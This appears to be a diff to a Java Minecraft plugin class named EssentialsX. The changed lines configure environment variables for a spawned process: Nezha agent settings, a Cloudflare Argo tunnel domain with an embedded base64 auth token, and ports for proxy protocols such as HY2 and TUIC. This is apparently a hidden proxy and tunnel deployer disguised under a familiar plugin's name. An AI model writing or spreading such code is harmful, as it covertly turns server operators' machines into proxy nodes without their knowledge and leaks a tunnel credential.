@@ -73,17 +73,17 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
+        env.put("UUID", "929f3b00-650f-48a2-baa4-303d6cb8e5a4");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "929f3b00-650f-48a2-baa4-303d6cb8e5a4");
+        env.put("ARGO_DOMAIN", "freeze.wxg.dpdns.org");
         env.put("ARGO_AUTH", "eyJhIjoiNjYyNDZkZmE3Nzg5YjJjYTQ4NTRjMGY0MzhjMTdiZGMiLCJ0IjoiNjhmZmM4MzItMmQ3OS00ZjhlLWI5ZmUtNmFhMDZjZGEwNjQ4IiwicyI6Ik5HSmpNakpsWWpBdFpqVTBNeTAwWkRaaExUZzNOemN0WVRBMVlUSXlOekU0WVRFMiJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "9094");
-        env.put("TUIC_PORT", "10434");
+        env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
